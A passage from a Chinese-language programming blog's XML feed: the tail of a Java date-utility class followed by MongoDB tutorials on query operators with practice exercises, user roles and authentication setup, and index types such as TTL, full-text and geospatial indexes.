getNextDay(Date date, int i) &#123; Calendar cal = new GregorianCalendar(); cal.setTime(date); cal.set(Calendar.DATE, cal.get(Calendar.DATE) + i); return cal.getTime(); &#125; /** * 返回某个日期前几天的日期 * @param date * @param i * @return */ public static Date getFrontDay(Date date, int i) &#123; Calendar cal = new GregorianCalendar(); cal.setTime(date); cal.set(Calendar.DATE, cal.get(Calendar.DATE) - i); return cal.getTime(); &#125; /** * 获取某年某月到某年某月按天的切片日期集合（间隔天数的集合） * @param beginYear * @param beginMonth * @param endYear * @param endMonth * @param k * @return */ @SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;) public static List getTimeList(int beginYear, int beginMonth, int endYear, int endMonth, int k) &#123; List list = new ArrayList(); if (beginYear == endYear) &#123; for (int j = beginMonth; j &lt;= endMonth; j++) &#123; list.add(getTimeList(beginYear, j, k)); &#125; &#125; else &#123; &#123; for (int j = beginMonth; j &lt; 12; j++) &#123; list.add(getTimeList(beginYear, j, k)); &#125; for (int i = beginYear + 1; i &lt; endYear; i++) &#123; for (int j = 0; j &lt; 12; j++) &#123; list.add(getTimeList(i, j, k)); &#125; &#125; for (int j = 0; j &lt;= endMonth; j++) &#123; list.add(getTimeList(endYear, j, k)); &#125; &#125; &#125; return list; &#125; /** * 获取某年某月按天切片日期集合（某个月间隔多少天的日期集合） * @param beginYear * @param beginMonth * @param k * @return */ @SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;) public static List getTimeList(int beginYear, int beginMonth, int k) &#123; List list = new ArrayList(); Calendar begincal = new GregorianCalendar(beginYear, beginMonth, 1); int max = begincal.getActualMaximum(Calendar.DATE); for (int i = 1; i &lt; max; i = i + k) &#123; list.add(begincal.getTime()); begincal.add(Calendar.DATE, k); &#125; begincal = new GregorianCalendar(beginYear, beginMonth, max); list.add(begincal.getTime()); return list; &#125; /** * 获取某年某月的第一天日期 * @param year * @param month * @return */ public static Date getStartMonthDate(int year, int month) &#123; Calendar calendar = Calendar.getInstance(); calendar.set(year, month - 1, 1); return calendar.getTime(); &#125; /** * 获取某年某月的最后一天日期 * @param year * @param month * @return */ public static Date getEndMonthDate(int year, int month) &#123; Calendar calendar = Calendar.getInstance(); calendar.set(year, month - 1, 1); int day = calendar.getActualMaximum(5); calendar.set(year, month - 1, day); return calendar.getTime(); &#125; public static void main(String[] args) &#123; System.out.println(getDays()); System.out.println(getAfterDayWeek(&quot;3&quot;)); System.out.println(fomatDate(getBeginDayOfYesterday(), &quot;yyyy-MM-dd&quot;)); System.out.println(getTimeList(2017, 1, 7)); System.out.println(getTimeList(2016, 1, 2017, 1, 7)); &#125;&#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (六)：高级命令操作与实操]]></title>
    <url>%2Fblog%2F2017%2F10%2F25%2FMongoDB%20(%E5%85%AD)%EF%BC%9A%E9%AB%98%E7%BA%A7%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C%E4%B8%8E%E5%AE%9E%E6%93%8D%2F</url>
    <content type="text"><![CDATA[MongoDB 高级命令语法 修改器名称 语法 案例 说明 $lt $lt:value db.persons.find({age:{$lt:27}) 查询age 小于 27的数据 $lte $lte:value db.persons.find({age:{$lte:27}) 查询age 小于等于 27的数据 $gt $gt:value db.persons.find({age:{$gt:27}) 查询age 大于27 的数据 $gte $gte:value db.persons.find({age:{$gte:27}) 查询age 大于等于27 的数据 $ne $ne:value db.persons.find({age:{$ne:27}) 查询age 不等于27 的数据 $set {$set:{key:value}} db.language.update({lang:”CH”},{$set:{name:”中国”}},true) 用来指定一个键值对,如果存在键就进行修改不存在则进行添加，第三个参数是不存在就添加 $inc {$inc:{key:value}} db.people.update({age:23},{$inc:{age:1}},true) 使用与数字类型,他可以为指定的键对应的数字类型的数值进行加(value=1)减(value=-1)操作.给age为23 的自增 $unset {$unset:{key:value}}} db.people.update({name:”jj”},{$unset:{age:1}}) 删除指定的键，在people这个文档中删除name为jj,的age属性 $push {$push:{key:value}} db.people.update({_id:1},{$push:{skills:”MongoDB”}},true) 如果指定的键是数组增追加新的数值,如果指定的键不是数组则中断当前操作,如果不存在指定的键则创建数组类型的键值对 $pushAll {$pushAll:{key:value}} db.people.update({_id:2},{$pushAll:{skills:[“MongoDB”,”JAVA”]}},true) 用法和$push相似它可以添加数组数据 $addToSet {$addToSet:{key:value}} db.people.update({_id:2},{$addToSet:{skills:”Linux”}}) 目标数组存在此项则不操作,不存在此项则加进去 $pop {$pop:{key:value}} db.people.update({_id:2},{$pop:{skills:-1}}) 从指定数组删除一个值1删除最后一个数值,-1删除第一个数值 $pull {$pull:{key:value}} db.people.update({_id:2},{$pull:{skills:”C++”}}) 从指定数组删除一个被指定的数值 $pullAll {$pullAll:{key:array}} db.people.update({_id:2},{$pullAll:{skills:[“C++”,”Linux”]}}) 从指定数组删除一个被指定的数值 $each {$each:{key:array}} db.people.update({_id:3},{$addToSet:{skills:{$each:[“MongoDB”,”JAVA”,”linux”]}}},true) 循环操作，这样就可以合并两个不同的数组了 $ 数组定位器 array.$.parame db.people.update({teacher.name:”bb”},{$set:{“teacher.$.sex”:”female”}}) 如果以有这么一条数据： { “_id” : ObjectId(“59f02f593e1b3b89f138d979”), “name” : “rstyro”, “age” : 23, “teacher” : [ { “name” : “aa”, “teach” : “english” }, { “name” : “bb”, “teach” : “math” }, { “name” : “cc”, “teach” : “chinese” } ] } 你要对teacher 数组中的name 为bb 添加一个sex 属性。 实操题练习一、导入数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990var persons = [&#123; name:&quot;jim&quot;, age:25, email:&quot;75431457@qq.com&quot;, c:89,m:96,e:87, country:&quot;USA&quot;, books:[&quot;JS&quot;,&quot;C++&quot;,&quot;EXTJS&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;tom&quot;, age:25, email:&quot;214557457@qq.com&quot;, c:75,m:66,e:97, country:&quot;USA&quot;, books:[&quot;PHP&quot;,&quot;JAVA&quot;,&quot;EXTJS&quot;,&quot;C++&quot;]&#125;,&#123; name:&quot;lili&quot;, age:26, email:&quot;344521457@qq.com&quot;, c:75,m:63,e:97, country:&quot;USA&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;C#&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;zhangsan&quot;, age:27, email:&quot;2145567457@qq.com&quot;, c:89,m:86,e:67, country:&quot;China&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;EXTJS&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;lisi&quot;, age:26, email:&quot;274521457@qq.com&quot;, c:53,m:96,e:83, country:&quot;China&quot;, books:[&quot;JS&quot;,&quot;C#&quot;,&quot;PHP&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;wangwu&quot;, age:27, email:&quot;65621457@qq.com&quot;, c:45,m:65,e:99, country:&quot;China&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;C++&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;zhaoliu&quot;, age:27, email:&quot;214521457@qq.com&quot;, c:99,m:96,e:97, country:&quot;China&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;EXTJS&quot;,&quot;PHP&quot;]&#125;,&#123; name:&quot;piaoyingjun&quot;, age:26, email:&quot;piaoyingjun@uspcat.com&quot;, c:39,m:54,e:53, country:&quot;Korea&quot;, books:[&quot;JS&quot;,&quot;C#&quot;,&quot;EXTJS&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;lizhenxian&quot;, age:27, email:&quot;lizhenxian@uspcat.com&quot;, c:35,m:56,e:47, country:&quot;Korea&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;EXTJS&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;lixiaoli&quot;, age:21, email:&quot;lixiaoli@uspcat.com&quot;, c:36,m:86,e:32, country:&quot;Korea&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;PHP&quot;,&quot;MONGODB&quot;]&#125;,&#123; name:&quot;zhangsuying&quot;, age:22, email:&quot;zhangsuying@uspcat.com&quot;, c:45,m:63,e:77, country:&quot;Korea&quot;, books:[&quot;JS&quot;,&quot;JAVA&quot;,&quot;C#&quot;,&quot;MONGODB&quot;]&#125;]for(i=0;i&lt;persons.length;i++)db.persons.insert(persons[i]) 二、练习1、查询查询出年龄在25到27岁之间的学生1db.persons.find(&#123;age:&#123;$gte:25,$lte:27&#125;&#125;,&#123;_id:0,name:1,age:1&#125;) 查询出所有不是韩国籍的学生的数学成绩1db.persons.find(&#123;country:&#123;$ne:” Korea”&#125;&#125;,&#123;_id:0,m:1,name:1&#125;) 2、包含或不包含 $in或$nin查询国籍是中国或美国的学生信息1db.persons.find(&#123;country:&#123;$in:[&quot;USA&quot;,&quot;China&quot;]&#125;&#125;) 查询国籍不是中国或美国的学生信息1db.persons.find(&#123;country:&#123;$nin:[&quot;USA&quot;,&quot;China&quot;]&#125;&#125;) 3、OR查询 $or查询语文成绩大于85或者英语大于90的学生信息1db.persons.find(&#123;$or:[&#123;c:&#123;$gt:85&#125;&#125;,&#123;e:&#123;$gt:90&#125;&#125;]&#125;,&#123;_id:0,name:1,c:1,e:1&#125;) 4、Null把中国国籍的学生上增加新的键sex1db.person.update(&#123;country:&quot;China&quot;&#125;,&#123;$set:&#123;sex:&quot;m&quot;&#125;&#125;) 查询出sex 等于 null的学生1db.persons.find(&#123;sex:&#123;$in:[null]&#125;&#125;,&#123;name:1&#125;) 5、正则查询查询出名字中存在”li”的学生的信息1db.persons.find(&#123;name:/li/i&#125;,&#123;_id:0,name:1&#125;) 6、$not的使用$not可以用到任何地方进行取反操作查询出名字中不存在”li”的学生的信息1db.persons.find(&#123;name:&#123;$not:/li/i&#125;&#125;,&#123;_id:0,name:1&#125;) $not和$nin的区别是$not可以用在任何地方儿$nin是用到集合上的7、数组查询$all和index应用查询有MONGOD和JS的学生1db.persons.find(&#123;books:&#123;$all:[&quot;MONGOBD&quot;,&quot;JS&quot;]&#125;&#125;,&#123;books:1,_id:0,name:1&#125;) 查询第二本书是JAVA的学习信息1db.persons.find(&#123;&quot;books.1&quot;:&quot;JAVA&quot;&#125;) 8、查询指定长度数组$size它不能与比较查询符一起使用(这是弊端)查询出拥有书籍数量是4本的学生1db.persons.find(&#123;books:&#123;$size:4&#125;&#125;,&#123;_id:0,books:1,name:1&#125;) 9、查询出拥有的书籍数量大于3本的学生增加字段size1db.persons.update(&#123;&#125;,&#123;$set:&#123;size:4&#125;&#125;,false, true) 改变书籍的更新方式,每次增加书籍的时候size增加11db.persons.update(&#123;查询器&#125;,&#123;$push:&#123;books:&quot;ORACLE&quot;&#125;,$inc:&#123;size:1&#125;&#125;) 利用$gt查询1db.persons.find(&#123;size:&#123;$gt:3&#125;&#125;) 10、利用shell查询出Jim拥有的书的数量12345var persons = db.persons.find(&#123;name:&quot;jim&quot;&#125;)while(persons.hasNext())&#123; obj = persons.next(); print(obj.books.length)&#125; 11、$slice操作符返回文档中指定数组的内部值查询出Jim书架中第2~4本书1db.persons.find(&#123;name:&quot;jim&quot;&#125;,&#123;books:&#123;&quot;$slice&quot;:[1,3]&#125;&#125;) 查询出最后一本书1db.persons.find(&#123;name:&quot;jim&quot;&#125;,&#123;books:&#123;&quot;$slice&quot;:-1&#125;,_id:0,name:1&#125;) 12、文档查询为jim添加学习简历文档 jim.json1234567891011var jim = [&#123; school :&quot;K&quot;, score:&quot;A&quot;&#125;,&#123; school :&quot;L&quot;, score:&quot;B&quot;&#125;,&#123; school :&quot;J&quot;, score:&quot;A+&quot;&#125;]db.persons.update(&#123;name:&quot;jim&quot;&#125;,&#123;$set:&#123;school:jim&#125;&#125;) 查询出在K上过学的学生这个我们用绝对匹配可以完成,但是有些问题(找找问题?顺序?总要带着score?)1db.persons.find(&#123;school:&#123;school:&quot;K&quot;,score:&quot;A&quot;&#125;&#125;,&#123;_id:0,school:1&#125;) 为了解决顺序的问题我可以用对象”.”的方式定位1db.persons.find(&#123;&quot;school.score&quot;:&quot;A&quot;,&quot;school.school&quot;:&quot;K&quot;&#125;,&#123;_id:0,school:1&#125;) 这样也有问题看例子:1db.persons.find(&#123;&quot;school.score&quot;:&quot;A&quot;,&quot;school.school&quot;:&quot;J&quot;&#125;,&#123;_id:0,school:1&#125;) 同样能查出刚才那条数据,原因是score和school会去其他对象对比 正确做法单条条件组查询$elemMatch1db.persons.find(&#123;school:&#123;$elemMatch:&#123;school:&quot;K&quot;,score:&quot;A&quot;&#125;&#125;&#125;) 13、$where查询年龄大于22岁,拥有C++书,在K学校上过学的学生信息复杂的查询我们就可以用$where因为他是万能但是我们要尽量避免少使用它因为他会有性能的代价1234567891011121314151617181920db.persons.find(&#123;&quot;$where&quot;:function()&#123; var books = this.books; var school = this.school; if(this.age &gt; 22)&#123; var ccc = null; for ( var i = 0; i &lt; books.length; i++) &#123; if(books[i] == &quot;C++&quot;)&#123; ccc = books[i]; if(school)&#123; for (var j = 0; j &lt; school.length; j++) &#123; if(school[j].school == &quot;K&quot;)&#123; return true; &#125; &#125; break; &#125; &#125; &#125; &#125;&#125;&#125;) 14、Limit返回指定的数据条数查询出persons文档中前5条数据1db.persons.find(&#123;&#125;,&#123;_id:0,name:1&#125;).limit(5) 15、Skip返回指定数据的跨度查询出persons文档中第5~10条的数据1db.persons.find(&#123;&#125;,&#123;_id:0,name:1&#125;).limit(5).skip(5) 16、Sort返回按照年龄排序的数据[1,-1]1db.persons.find(&#123;&#125;,&#123;_id:0,name:1,age:1&#125;).sort(&#123;age:1&#125;) 注意:mongodb的key可以存不同类型的数据排序就也有优先级 最小值 null 数字 字符串 对象/文档 数组 二进制 对象ID 布尔 日期 时间戳 &gt; 正则 &gt; 最大值]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (五)：安全浅析]]></title>
    <url>%2Fblog%2F2017%2F10%2F24%2FMongoDB%20(%E4%BA%94)%EF%BC%9A%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[MongoDB 安全浅析MongoDB副本集默认会创建local、admin数据库，local数据库主要存储副本集的元数据，admin数据库则主要存储MongoDB的用户、角色等信息当Mongod启用auth选项时，用户需要创建数据库帐号，访问时根据帐号信息来鉴权，而数据库帐号信息就存储在admin数据库下一、角色1、数据库用户角色(a)、read 提供对所有读取数据的权限 (b)、readWrite 提供read角色的所有权限以及修改所有非系统集合的权限 2、数据库管理角色(a)、dbAdmin提供执行管理任务的能力，如模式相关任务，索引，收集统计信息。此角色不授予用户和角色管理权限。对非系统集合提供了一下操作： bypassDocumentValidation collMod collStats compact convertToCapped createCollection createIndex dbStats dropCollection dropDatabase dropIndex enableProfiler reIndex renameCollectionSameDB repairDatabase storageDetails validate (b)、dbOwner 数据库所有者可以对数据库执行任何管理操作 (c)、userAdmin 提供创建和修改数据库角色和用户的功能。在数据库上具有此角色的用户可以为该数据库的任何用户（包括其自身）分配任何角色或特权 (d)、root 超级管理员 3、集群角色(a)、clusterAdmin 提供最大的集群管理访问 (b)、clusterManager 在集群上提供管理和监控动作。具有该角色的用户可以访问config和local 数据库，其在分片和复制所使用的 (c)、clusterMonitor 提供对监控工具的只读访问权限 (d)、hostManager 提供监控和管理服务器的能力 4、备份角色(a)、backup 提供备份数据所需的权限 (b)、restore 提供在mongorestore没有--oplogReplay选项或没有system.profile收集数据的情况下恢复数据所需的权限 5、全数据库角色 版本V3.4更改 角色 介绍说明 readAnyDatabase 提供相同的只读权限read，除了它适用 于群集中的所有其他数据库local和config数据库。该角色还为listDatabases整个群集提供了 行动。有关角色授予的特定权限，请参阅 readAnyDatabase。在3.4版中更改：3.4之前，readAnyDatabase包含local 和config数据库。要为数据库提供read权限，请在local数据库中使用admin 数据库中的read角色创建一个用户local 。另请参阅clusterManager访问config和local数据库的角色。 readWriteAnyDatabase 提供相同的读取和写入权限 readWrite，除了它适用于群集中的所有其他 数据库local和config数据库。该角色还为listDatabases整个群集提供了行动。有关角色授予的特定权限，请参阅 readWriteAnyDatabase。在3.4版中更改：3.4之前，readWriteAnyDatabase包含 local和config数据库。要为数据库提供readWrite 权限，请在local数据库中使用admin数据库中的readWrite角色 创建一个用户 local。 userAdminAnyDatabase 提供与用户管理操作相同的访问权限 userAdmin，除了适用于群集中的所有其他 数据库local和config数据库。由于该userAdminAnyDatabase角色允许用户向任何用户（包括其自身）授予任何权限，该角色也间接提供超级用户访问权限。有关角色授予的特定权限，请参阅 userAdminAnyDatabase。在3.4版中更改：3.4之前，userAdminAnyDatabase包含 local和config数据库。 dbAdminAnyDatabase 提供与数据库管理操作相同的访问权限dbAdmin，除了适用于群集中的所有其他 数据库local和config数据库。该角色还为listDatabases整个群集提供了行动。有关角色授予的特定权限，请参阅 dbAdminAnyDatabase。在3.4版中更改：3.4之前，dbAdminAnyDatabase包含 local和config数据库。要为数据库提供dbAdmin 权限，请在local数据库中使用admin数据库中的dbAdmin角色 创建一个用户 local。另请参阅clusterManager访问config和local数据库的角色。 二、创建自定义角色1、语法：db.createRole(role, writeConcern) 参数 类型 描述 role document 包含角色名称和角色定义的文档。 writeConcern document 可选的。写入的程度适用于此操作。该writeConcern文档使用与getLastError命令相同的字段。 2、role 格式如下：1234567891011&#123; role: &quot;&lt;name&gt;&quot;, privileges: [ &#123; resource: &#123; &lt;resource&gt; &#125;, actions: [ &quot;&lt;action&gt;&quot;, ... ] &#125;, ... ], roles: [ &#123; role: &quot;&lt;role&gt;&quot;, db: &quot;&lt;database&gt;&quot; &#125; | &quot;&lt;role&gt;&quot;, ... ]&#125; 参数 类型 描述 role String 新角色的名称。 privileges array 授予角色的权限。有关语法，请参阅 privileges数组。您必须包括该privileges字段。使用空数组来指定没有权限。 roles array 这个角色继承权限的角色数组。您必须包括该roles字段。使用空数组来指定 不继承的角色。 3、栗子12345678910111213141516use admindb.createRole( &#123; role: &quot;myClusterwideAdmin&quot;, privileges: [ &#123; resource: &#123; cluster: true &#125;, actions: [ &quot;addShard&quot; ] &#125;, &#123; resource: &#123; db: &quot;config&quot;, collection: &quot;&quot; &#125;, actions: [ &quot;find&quot;, &quot;update&quot;, &quot;insert&quot;, &quot;remove&quot; ] &#125;, &#123; resource: &#123; db: &quot;users&quot;, collection: &quot;usersCollection&quot; &#125;, actions: [ &quot;update&quot;, &quot;insert&quot;, &quot;remove&quot; ] &#125;, &#123; resource: &#123; db: &quot;&quot;, collection: &quot;&quot; &#125;, actions: [ &quot;find&quot; ] &#125; ], roles: [ &#123; role: &quot;read&quot;, db: &quot;admin&quot; &#125; ] &#125;, &#123; w: &quot;majority&quot; , wtimeout: 5000 &#125;) 三、创建用户1、语法：db.createUser(user, writeConcern)2、user 参数的格式：12345678&#123; user: &quot;&lt;name&gt;&quot;, pwd: &quot;&lt;cleartext password&gt;&quot;, customData: &#123; &lt;any information&gt; &#125;, roles: [ &#123; role: &quot;&lt;role&gt;&quot;, db: &quot;&lt;database&gt;&quot; &#125; | &quot;&lt;role&gt;&quot;, ... ]&#125; 3、栗子12345678use admindb.createUser( &#123; user: &quot;accountAdmin01&quot;, pwd: &quot;changeMe&quot;, customData: &#123; employeeId: 12345 ,desc:&quot;这里是可以写备注的&quot;&#125;, roles: [ &#123; role: &quot;clusterAdmin&quot;, db: &quot;admin&quot; &#125;, &#123; role: &quot;readAnyDatabase&quot;, db: &quot;admin&quot; &#125;, &quot;readWrite&quot;] &#125;, &#123; w: &quot;majority&quot; , wtimeout: 5000 &#125; ) 四、开启权限认证第一种方法：在配置文件添加1auth = true 第二种方法：在启动的时候 加 参数： --auth1mongod --auth --port 27017 --dbpath /data/db1 当开启认证时，进入要认证才能执行相关操作12use admindb.auth(&quot;username&quot;,&quot;password&quot;) 五、修改用户权限一、db.grantRolesToUser(username, roles, writeConcern)这种是以追加的方式给用户添加权限1234db.grantRolesToUser( &quot;testUser&quot;, [&#123; role: &quot;readWrite&quot;, db: &quot;stock&quot; &#125;]) 上面的意思是给testUser用户添加stock数据库的读写权限 二、db.updateUser(username, update, writeConcern)这种方式是替换账号的原有的角色12345678db.updateUser( &quot;appClient01&quot;, &#123; customData : &#123; employeeId : &quot;0x3039&quot; &#125;, roles : [ &#123; role : &quot;read&quot;, db : &quot;assets&quot; &#125; ] &#125; ) 这种方式其实和创建的时候差不多，就稍稍有点不同 六、一些常用的方法1、删除用户12345# 第二个参数可选，db.dropUser(username,writeConcern)# V2.6以后已弃用# db.removeUser(username) 2、修改用户密码1db.changeUserPassword(username, password) 3、删除角色1db.dropRole(rolename,writeConcern ) 参考文献：https://docs.mongodb.com/manual/security/]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (四)：索引]]></title>
    <url>%2Fblog%2F2017%2F10%2F23%2FMongoDB%20(%E5%9B%9B)%EF%BC%9A%E7%B4%A2%E5%BC%95%2F</url>
    <content type="text"><![CDATA[MongoDB 的索引MongoDB 的索引种类1、_id 索引2、单键索引3、复合索引4、多键索引5、过期索引6、全文索引7、地理位置索引查看索引的信息1db.test.getIndexes() 一、_id 索引这个索引绝大多数集合默认建立的索引，一个唯一的索引二、单键索引单键索引最普通的索引1、创建索引,给 name 这个列添加索引123456# 这个应该是V3.0 之前的方法了db.test.ensureIndex(&#123;name:1&#125;)# 这个是V3.0后的新方法，推荐用这个db.test.createIndex(&#123;name:1&#125;)#一个值1指定以升序排列的索引。-1指定按降序排列的索引。 2、创建索引的其他参数属性(a)、name 指定，给索引命名1db.test.createIndex(&#123;name:1&#125;,&#123;name:&quot;indexName&quot;&#125;) (b)、unique 唯一性 ,为true 时 当插入已存在name 的值后，将报错1db.test.createIndex(&#123;name:1&#125;,&#123;unique:true/false&#125;) (c)、sparse 稀疏性，当为true时，索引字段不存在时将不创建索引，1db.test.createIndex(&#123;name:1&#125;,&#123;sparse:true/false&#125;) (d)、expireAfterSeconds 过期， 下面会讲到三、复合索引复合索引可以支持与多个字段匹配的查询简单说就是把多个字段组合成一个单键索引四、多键索引1、这个和单键的区别就是，索引可以是一个数组2、栗子12345# 有这么一个数据&#123; _id: 1, item: &quot;ABC&quot;, ratings: [ 2, 5, 9 ] &#125;# 创建一个索引db.survey.createIndex( &#123; ratings: 1 &#125; ) 或者这样的12345678910111213141516171819202122232425262728293031323334&#123; _id: 1, item: &quot;abc&quot;, stock: [ &#123; size: &quot;S&quot;, color: &quot;red&quot;, quantity: 25 &#125;, &#123; size: &quot;S&quot;, color: &quot;blue&quot;, quantity: 10 &#125;, &#123; size: &quot;M&quot;, color: &quot;blue&quot;, quantity: 50 &#125; ]&#125;&#123; _id: 2, item: &quot;def&quot;, stock: [ &#123; size: &quot;S&quot;, color: &quot;blue&quot;, quantity: 20 &#125;, &#123; size: &quot;M&quot;, color: &quot;blue&quot;, quantity: 5 &#125;, &#123; size: &quot;M&quot;, color: &quot;black&quot;, quantity: 10 &#125;, &#123; size: &quot;L&quot;, color: &quot;red&quot;, quantity: 2 &#125; ]&#125;&#123; _id: 3, item: &quot;ijk&quot;, stock: [ &#123; size: &quot;M&quot;, color: &quot;blue&quot;, quantity: 15 &#125;, &#123; size: &quot;L&quot;, color: &quot;blue&quot;, quantity: 100 &#125;, &#123; size: &quot;L&quot;, color: &quot;red&quot;, quantity: 25 &#125; ]&#125;# 创建索引db.inventory.createIndex( &#123; &quot;stock.size&quot;: 1, &quot;stock.quantity&quot;: 1 &#125; )# 可以复合查询，这样，quantity大于20，size 为S 码db.inventory.find( &#123; &quot;stock.size&quot;: &quot;S&quot;, &quot;stock.quantity&quot;: &#123; $gt: 20 &#125; &#125; ) 五、过期索引过期索引又称 TTL（Time To Live，生存时间）索引，即在一段时间后会过期的索引（如登录信息、日志等）我们知道添加索引，对于数据库的 添加、修改、删除是有影响的。当索引过期后，相应的数据将被删除适合存贮一段时间过后，失效的数据12# 参数一 --- 索引字段名称 ，参数二 ---- 过期时间 ，单位：秒db.item.createIndex( &#123;createTime: 1 &#125;, &#123; expireAfterSeconds: 60*60 &#125; ) 1、mongdb时间类型 Date() 显示当前的时间 new Date 构建一个格林尼治时间 可以看到正好和Date()相差8小时，我们是+8时区，也就是时差相差8，所以+8小时就是系统当前时间 ISODate() 格林尼治时间 2、过期索引的限制：1、存储在过期索引的字段必须是指定的时间类型 时间类型必须为ISODate类型，或者ISODate 数组。不能使用时间戳，否则不能被自动删除 2、如果指定了Date数组，则按照最小的时间进行删除3、过期索引不能是复合索引4、删除时间不是精确的 说明：删除过程是由后台程序每60s执行一次，而且删除也需要一些时间所以存在误差 3、栗子12345678# 创建一个时间索引，60秒后过期db.time.createIndex(&#123;time:1&#125;,&#123;expireAfterSeconds:60&#125;)# 插入一条数据db.time.insert(&#123;time:new Date()&#125;)# 查询数据db.time.find()# 60秒后再查询，发现数据没有了db.time.find() 六、全文索引对字符串与字符串数组创建全文可搜索的索引1、创建格式：1234# key 代表一个字段名称，`$**` 是全局匹配db.articles.createIndex(&#123;key:&quot;text&quot;&#125;)db.articles.createIndex(&#123;key_1:&quot;text&quot;,key_2:&quot;text&quot;&#125;)db.articles.createIndex(&#123;&quot;$**&quot;:&quot;text&quot;&#125;) 2、栗子12345678910111213141516171819# 插入数据db.articles.insert(&#123;auther:&quot;lrshuai&quot;,title:&quot;mongdb&quot;,content:&quot;mongdb about&quot;&#125;)db.articles.insert(&#123;auther:&quot;lrshuai&quot;,title:&quot;mongdb&quot;,content:&quot;mongdb information&quot;&#125;)db.articles.insert(&#123;auther:&quot;lrshuai&quot;,title:&quot;mongdb&quot;,content:&quot;mongdb information content&quot;&#125;)# 查看所有信息db.articles.find()# 创建全文索引db.articles.createIndex(&#123;content:&quot;text&quot;&#125;)# 使用全局索引查找# 查找内容中包含mongodb 的数据db.articles.find(&#123;$text:&#123;$search:&quot;mongdb&quot;&#125;&#125;)# 查找内容中包含mongodb 或者 information 的数据db.articles.find(&#123;$text:&#123;$search:&quot;mongdb information&quot;&#125;&#125;)# 查找内容中包含mongodb 但不包含information的数据db.articles.find(&#123;$text:&#123;$search:&quot;mongdb -information&quot;&#125;&#125;)# 查找内容中包含mongodb 并且包含information 的数据db.articles.find(&#123;$text:&#123;$search:&quot;\&quot;mongdb\&quot; \&quot;information\&quot;&quot;&#125;&#125;) 3、全文索引相似度查询12345# score 相似度值，越高越相似db.articles.find(&#123;$text:&#123;$search:&quot;mongdb&quot;&#125;&#125;,&#123;score:&#123;$meta:&quot;textScore&quot;&#125;&#125;)# 相似度排序，高在前db.articles.find(&#123;$text:&#123;$search:&quot;mongdb&quot;&#125;&#125;,&#123;score:&#123;$meta:&quot;textScore&quot;&#125;&#125;).sort(&#123;score:&#123;$meta:&quot;textScore&quot;&#125;&#125;) 4、全文索引的限制 每次查询，只能指定一个$text 查询 $text 查询不能出现在$nor 查询中 查询中如果包含了$text,hine 不再起作用 七、地理位置索引概念：将一些点的位置存储在Mongodb 中，创建索引后可以按照位置来查找其他的点子分类：1、2d 索引：平面地理位置索引用于存储和查找平面上的点创建方式：db.locate.insert({width:[经度,纬度]})取值范围：经度：[-180,180]，纬度:[-90,90]1234567891011121314151617181920# 创建索引db.locate.createIndex(&#123;width:&quot;2d&quot;&#125;)# 查找离点[1,1] 最远是10 的范围点集合db.locate.find(&#123;width:&#123;$near:[1,1],$maxDistance:40&#125;&#125;)# 查找离点[1,1] 最远是40，最近是2 的范围点集合，3.X版本的 $minDiatance 才可以直接使用db.locate.find(&#123;width:&#123;$near:[1,1],$maxDistance:40,$minDistance: 2&#125;&#125;)# 矩形查询 db.locate.find(&#123;width:&#123;$geoWithin:&#123;$box:[[30,20],[33,30]]&#125;&#125;&#125;)# 圆，一个是圆心，第二个是半径db.locate.find(&#123;width:&#123;$geoWithin:&#123;$center:[[30,20],10&#125;&#125;&#125;)# 多边形db.locate.find(&#123;width:&#123;$geoWithin:&#123;$polygon:[[0,0],[-1,20],[30,30]]&#125;&#125;&#125;)# geoNear 查询，geoNear --- 集合名词，near -- 范围， num 是返回的数量db.runCommand(&#123;geoNear:&quot;locate&quot;,near:[30,20],maxDistance:20,minDistance:1,num:5&#125;) 2、2dsphere 索引：球面地理位置索引用于存储和查找球面上的点2dsphere需要插入GeoJson数据。GeoJson的格式是：{ type: ‘GeoJSON type’ , coordinates: ‘coordinates’ } 其中type指的是类型， Point（经纬度坐标点） LineString（两个坐标点，组成一条线） Polygon（多边形） coordinates是一个坐标数组 12# 创建索引db.locate.createIndex(&#123;width:&quot;2dsphere&quot;&#125;) 八、索引构建情况分析索引的好处：加快索引相关的查询索引的缺点：增加磁盘空间消耗，降低写入性能评判索引构建的方法：2、profile 集合当开启的时候 数据库就会有一个system.profile 的集合 1、db.getProfilingStatus() 查看状态 2、db.getProfilingLevel() 获得级别 0 – 关闭 1 – 记录符合 slowms 条件的记录 2 — 记录所有 3、一般开发的调试的时候会开启，生产环境一般都是关闭的。因为会影响性能 3、日志介绍在配置文件中加入参数12# 1- 5个v，v 越多，信息越详细verbose = vvvvv 4、explain 分析1db.test.find(&#123;sex:1&#125;).explain(&quot;executionStats&quot;) 参考文献：https://docs.mongodb.com/manual/tutorial/measure-index-use/https://docs.mongodb.com/manual/reference/geojson/]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
